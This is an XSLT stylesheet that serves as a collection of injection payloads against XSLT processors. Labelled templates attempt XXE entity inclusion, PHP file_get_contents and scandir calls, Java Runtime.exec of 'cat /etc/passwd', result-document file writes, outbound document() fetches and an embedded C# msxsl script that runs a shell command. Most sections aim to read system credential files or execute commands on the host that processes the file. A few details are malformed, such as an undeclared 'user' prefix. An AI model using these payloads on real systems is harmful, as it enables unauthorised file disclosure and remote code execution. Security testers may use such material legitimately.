<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xsl:stylesheet [
<!ENTITY ext_file SYSTEM "file:///etc/passwd">
<!ENTITY file SYSTEM "http://localhost:8080">
]>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl"
                xmlns:java="http://saxon.sf.net/java-type"
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                xmlns:msxsl="urn:schemas-microsoft-com:xslt"
                version="1.0">

  <!-- XXE Exploits -->
  <xsl:template match="/">
    <xsl:text>--- XXE EXPLOITS ---</xsl:text>
    <xsl:value-of select="document('/etc/passwd')"/>
    &ext_file;
  </xsl:template>

  <!-- PHP Exploits -->
  <xsl:template match="/php">
    <xsl:text>--- PHP FUNCTION EXPLOITS ---</xsl:text>
    <xsl:value-of select="php:function('file_get_contents','/etc/passwd')"/>
    <xsl:value-of select="php:function('scandir','.')"/>
  </xsl:template>

  <!-- Java Runtime Exploits -->
  <xsl:template match="/java">
    <xsl:text>--- JAVA RUNTIME EXPLOITS ---</xsl:text>
    <xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cat /etc/passwd')"
                  xmlns:Runtime="java:java.lang.Runtime"/>
  </xsl:template>

  <!-- Write File Example -->
  <xsl:template match="/write">
    <xsl:text>--- WRITE FILE ---</xsl:text>
    <xsl:result-document href="output.txt">
      <xsl:text>Attempt to write file content</xsl:text>
    </xsl:result-document>
  </xsl:template>

  <!-- Network Access -->
  <xsl:template match="/network">
    <xsl:text>--- NETWORK EXPLOITS ---</xsl:text>
    <xsl:value-of select="document('http://example.com:22')"/>
  </xsl:template>

  <!-- MSXSL Script Execution -->
  <msxsl:script implements-prefix="user" language="C#">
    <![CDATA[
      public string execute() {
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName = "cat /etc/passwd";
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.UseShellExecute = false;
        proc.Start();
        proc.WaitForExit();
        return proc.StandardOutput.ReadToEnd();
      }
    ]]>
  </msxsl:script>
  <xsl:template match="/msxsl">
    <xsl:text>--- MSXSL SCRIPT EXECUTION ---</xsl:text>
    <xsl:value-of select="user:execute()"/>
  </xsl:template>

</xsl:stylesheet>
